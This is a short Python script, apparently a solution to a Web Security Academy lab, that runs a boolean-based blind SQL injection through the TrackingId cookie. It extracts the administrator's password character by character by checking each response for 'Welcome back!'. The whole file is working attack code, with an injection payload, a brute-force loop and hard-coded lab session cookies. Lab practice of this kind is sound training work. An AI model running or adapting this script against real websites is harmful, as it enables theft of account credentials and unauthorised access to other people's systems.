import requests


password=''
url="https://0ac9000f035b303e82957faf0070004d.web-security-academy.net/filter?category=Gifts"
cookies={"TrackingId":"R61dwxJRPmyMEYa6","session":"rb5BYA6YSAvWQcUWBnDESIWOviwdVLs5"}
for i in range(1,21):
    for j in range(32,127):
        payload=f"x6cRrybQeL06VE5O' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{i},1)='{chr(j)}"
        cookies["TrackingId"]=payload
        response=requests.get(url,cookies=cookies)
        if 'Welcome back!' in response.text:
            password+=chr(j)
            print(f"password ---> {password}")
            break
        else:
            pass
  